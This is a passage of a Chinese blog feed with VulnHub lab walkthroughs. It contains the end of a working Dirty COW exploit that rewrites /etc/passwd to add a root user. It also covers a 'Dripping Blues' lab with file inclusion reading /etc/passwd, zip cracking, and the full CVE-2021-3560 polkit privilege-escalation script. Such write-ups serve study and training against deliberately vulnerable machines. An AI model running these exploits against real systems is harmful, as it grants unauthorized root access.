class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">generate_password_hash</span><span class="params">(<span class="type">char</span> *plaintext_pw)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">generate_passwd_line</span><span class="params">(<span class="keyword">struct</span> Userinfo u)</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="type">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="type">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">copy_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *from, <span class="type">const</span> <span class="type">char</span> *to)</span> &#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="type">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="type">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="type">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="type">unsigned</span> <span class="type">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="type">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>靶机创建poc.c，用 gcc 编译并提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071252933.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071251343.png" /></p>
<p>切换用户 <code>firefart/root</code>，拿到第二个 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071254943.png" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>DRIPPING BLUES: 1</title>
    <url>/2023/08/26/dripping-blues-1/</url>
    <content><![CDATA[<blockquote>
<p>靶机介绍及下载：<a
href="https://www.vulnhub.com/entry/dripping-blues-1,744/">Dripping
Blues: 1 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24   </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261650477.jpg" />
靶机 IP：192.168.159.154</p>
<h3 id="nmap-扫描">1.2. nmap 扫描</h3>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">nmap -<span class="keyword">A</span> <span class="number">192.168.159.154</span> -p<span class="number">1-65535</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261657638.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261657467.jpg" /></p>
<p>简要分析，靶机开了21，22，80端口，21的 ftp 允许匿名登录，根目录还有个
respectmydrip.zip，22的ssh考虑弱口令，80端口开了web服务，并且扫到个robots.txt，不允许访问/dripisreal.txt和/etc/dripispowerful.html</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>浏览器访问站点</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261703688.jpg" />
提示站点被黑了，猜测系统存在 <code>travisscott</code> 和
<code>thugger</code> 用户 与此同时，目录遍历扫到一下结果 <img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261707947.jpg" />
根据 robots.txt 访问 dripisreal.txt</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261709155.jpg" /></p>
<p>说访问<a
href="https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html">Young
Thug - Constantly Hating Lyrics AZLyrics.com</a>页面的歌词，然后找 n
个单词计算MD5便能得到SSH登录的密码，看了下歌词，没思路……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261712017.jpg" /></p>
<p>尝试访问/etc/dripispowerful.html但访问不了，猜测可能存在文件包含啥的</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="ftp-登录">2.1. ftp 登录</h3>
<p>使用anonymous账号登录【密码为空】，下载
respectmydrip.zip，解压时发现需要密码，用kali尝试爆破下</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -<span class="selector-tag">p</span> rockyou<span class="selector-class">.txt</span> -u respectmydrip.zip</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261744120.jpg" /></p>
<p>解压后两个文件，没看懂，secret.zip
还是被加密了，尝试爆破未出来！没思路了换方向。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261746776.jpg" /></p>
<h3 id="文件包含">2.2. 文件包含</h3>
<p>由于 /etc/dripispowerful.html 的出现，猜测存在文件包含，测试 <a
href="http://192.168.159.154/index.php?file=/etc/dripispowerful.html">http://192.168.159.154/index.php?file=/etc/dripispowerful.html</a>
但没效果，卡住了，，，百度/谷歌后，看到大佬说参数是 drip，即 <a
href="http://192.168.159.154/index.php?drip=/etc/dripispowerful.html">http://192.168.159.154/index.php?drip=/etc/dripispowerful.html</a>
，哎……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261809752.jpg" /></p>
<p>图片看不出来啥信息，翻下源码看有啥用过用的信息，结果发现个密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261811959.jpg" /></p>
<p>读下/etc/passwd 看有哪些用户， <a
href="http://192.168.159.154/index.php?drip=/etc/passwd">http://192.168.159.154/index.php?drip=/etc/passwd</a>
结果如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:113:120:user <span class="keyword">for</span> cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false</span><br><span class="line">avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:117:123::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false</span><br><span class="line">whoopsie:x:120:125::/nonexistent:/bin/false</span><br><span class="line">colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">thugger:x:1001:1001:,,,:/home/thugger:/bin/bash</span><br><span class="line">sshd:x:126:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:127:133:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">ftp:x:128:134:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>猜测 <code>thugger</code> 用户对应前面这个密码。</p>
<h3 id="ssh-登录">2.3. ssh 登录</h3>
<p>由于开了 ssh，尝试用
<code>thugger</code>/<code>imdrippinbiatch</code> 登录，成功登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261824479.jpg" /></p>
<p>当前目录得到了第一个 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261825623.jpg" /></p>
<p>thugger 用户权限太低，得考虑提权获取root目录下的flag了</p>
<h3 id="提权">2.4. 提权</h3>
<p>查看了系统版本信息，没找到提权漏洞【太菜】。 查下看有啥提权命令没</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thugger@drippingblues:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/snap/core22/858/usr/bin/chfn</span><br><span class="line">/snap/core22/858/usr/bin/chsh</span><br><span class="line">/snap/core22/858/usr/bin/gpasswd</span><br><span class="line">/snap/core22/858/usr/bin/mount</span><br><span class="line">/snap/core22/858/usr/bin/newgrp</span><br><span class="line">/snap/core22/858/usr/bin/passwd</span><br><span class="line">/snap/core22/858/usr/bin/su</span><br><span class="line">/snap/core22/858/usr/bin/sudo</span><br><span class="line">/snap/core22/858/usr/bin/umount</span><br><span class="line">/snap/core22/858/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core22/858/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/snapd/19993/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core18/2790/bin/mount</span><br><span class="line">/snap/core18/2790/bin/ping</span><br><span class="line">/snap/core18/2790/bin/su</span><br><span class="line">/snap/core18/2790/bin/umount</span><br><span class="line">/snap/core18/2790/usr/bin/chfn</span><br><span class="line">/snap/core18/2790/usr/bin/chsh</span><br><span class="line">/snap/core18/2790/usr/bin/gpasswd</span><br><span class="line">/snap/core18/2790/usr/bin/newgrp</span><br><span class="line">/snap/core18/2790/usr/bin/passwd</span><br><span class="line">/snap/core18/2790/usr/bin/sudo</span><br><span class="line">/snap/core18/2790/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core18/2790/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core18/2128/bin/mount</span><br><span class="line">/snap/core18/2128/bin/ping</span><br><span class="line">/snap/core18/2128/bin/su</span><br><span class="line">/snap/core18/2128/bin/umount</span><br><span class="line">/snap/core18/2128/usr/bin/chfn</span><br><span class="line">/snap/core18/2128/usr/bin/chsh</span><br><span class="line">/snap/core18/2128/usr/bin/gpasswd</span><br><span class="line">/snap/core18/2128/usr/bin/newgrp</span><br><span class="line">/snap/core18/2128/usr/bin/passwd</span><br><span class="line">/snap/core18/2128/usr/bin/sudo</span><br><span class="line">/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core18/2128/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure>
<p>没看出来，又去看别人的提权操作了，<a
href="https://www.cnblogs.com/sainet/p/15672119.html">sainet</a> 提到
policykit 存在提权漏洞，先了解下 polkitd</p>
<blockquote>
<p>polkit
是一个应用程序级别的工具集，通过定义和审核权限规则，<strong>实现不同优先级进程间的通讯</strong>：控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。<br />
Polkit
<strong>在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统</strong>。和
sudo 等程序不同，Polkit 并没有赋予进程完全的 root
权限，而是通过一个集中的策略系统进行更精细的授权。<br />
Polkit 定义出一系列操作，例如运行 GParted,
并将用户按照群组或用户名进行划分，例如 wheel
群组用户。然后定义每个操作是否可以由某些用户执行，执行操作前是否需要一些额外的确认，例如通过输入密码确认用户是不是属于某个群组。</p>
</blockquote>
<p>系统进程信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261931007.jpg" /></p>
<p>查找到 Polkit 存在 CVE-2021-3560 的提权漏洞</p>
<blockquote>
<p>CVE-2021-3560 是对 polkit 的一种身份验证绕过，它允许非特权用户使用
DBus 调用特权方法，在这个漏洞中我们将调用 accountservice 提供的 2
个特权方法（CreateUser 和
SetPassword），这允许我们创建一个特权用户然后为其设置密码，最后以创建的用户身份登录，然后提升为root。</p>
</blockquote>
<p>提权exploit：<a
href="https://github.com/Almorabea/Polkit-exploit">GitHub -
Almorabea/Polkit-exploit: Privilege escalation with polkit -
CVE-2021-3560</a> CVE-2021-3560.py【留个备份】</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pwd</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;**************&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Exploit: Privilege escalation with polkit - CVE-2021-3560&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Exploit code written by Ahmad Almorabea @almorabea&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Original exploit author: Kevin Backhouse &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;**************&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting the Exploit &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">check = <span class="literal">True</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> check:</span><br><span class="line">    counter = counter +<span class="number">1</span></span><br><span class="line">    process = subprocess.Popen([<span class="string">&#x27;dbus-send&#x27;</span>,<span class="string">&#x27;--system&#x27;</span>,<span class="string">&#x27;--dest=org.freedesktop.Accounts&#x27;</span>,<span class="string">&#x27;--type=method_call&#x27;</span>,<span class="string">&#x27;--print-reply&#x27;</span>,<span class="string">&#x27;/org/freedesktop/Accounts&#x27;</span>,<span class="string">&#x27;org.freedesktop.Accounts.CreateUser&#x27;</span>,<span class="string">&#x27;string:ahmed&#x27;</span>,<span class="string">&#x27;string:&quot;Ahmad Almorabea&#x27;</span>,<span class="string">&#x27;int32:1&#x27;</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print(&#x27;1 - Running in process&#x27;, process.pid)</span></span><br><span class="line">        Random = random.uniform(<span class="number">0.006</span>,<span class="number">0.009</span>)</span><br><span class="line">        process.wait(timeout=Random)</span><br><span class="line">        process.kill()</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">            <span class="comment">#print(&#x27;Timed out - killing&#x27;, process.pid)</span></span><br><span class="line">            process.kill()</span><br><span class="line"></span><br><span class="line">    user = subprocess.run([<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;ahmed&#x27;</span>], stdout=subprocess.PIPE).stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.find(<span class="string">&quot;uid&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] User Created with the name of ahmed&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Timed out at: &quot;</span>+<span class="built_in">str</span>(Random))</span><br><span class="line">        check =<span class="literal">False</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> counter &gt; <span class="number">2000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Couldn&#x27;t add the user, try again it may work&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    uid = <span class="string">&quot;/org/freedesktop/Accounts/User&quot;</span>+<span class="built_in">str</span>(pwd.getpwnam(<span class="string">&#x27;ahmed&#x27;</span>).pw_uid)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#In case you need to put a password un-comment the code below and put your password after string:yourpassword&#x27;</span></span><br><span class="line">    password = <span class="string">&quot;string:&quot;</span></span><br><span class="line">    <span class="comment">#res = subprocess.run([&#x27;openssl&#x27;, &#x27;passwd&#x27;,&#x27;-5&#x27;,password], stdout=subprocess.PIPE).stdout.decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">    <span class="comment">#password = f&quot;string:&#123;res.rstrip()&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    process = subprocess.Popen([<span class="string">&#x27;dbus-send&#x27;</span>,<span class="string">&#x27;--system&#x27;</span>,<span class="string">&#x27;--dest=org.freedesktop.Accounts&#x27;</span>,<span class="string">&#x27;--type=method_call&#x27;</span>,<span class="string">&#x27;--print-reply&#x27;</span>,uid,<span class="string">&#x27;org.freedesktop.Accounts.User.SetPassword&#x27;</span>,password,<span class="string">&#x27;string:GoldenEye&#x27;</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print(&#x27;1 - Running in process&#x27;, process.pid)</span></span><br><span class="line">            Random = random.uniform(<span class="number">0.006</span>,<span class="number">0.009</span>)</span><br><span class="line">            process.wait(timeout=Random)</span><br><span class="line">            process.kill()</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">            <span class="comment">#print(&#x27;Timed out - killing&#x27;, process.pid)</span></span><br><span class="line">            process.kill()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Timed out at: &quot;</span> + <span class="built_in">str</span>(Random))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit Completed, Your new user is &#x27;Ahmed&#x27; just log into it like, &#x27;su ahmed&#x27;, and then &#x27;sudo su&#x27; to root &quot;</span>)</span><br><span class="line"></span><br><span class="line">p = subprocess.call(<span class="string">&quot;(su ahmed -c &#x27;sudo su&#x27;)&quot;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>wget下载总是断掉，还是本地下载 Polkit-exploit - CVE-2021-3560
提权脚本，用 <code>scp</code> 上传靶机</p>
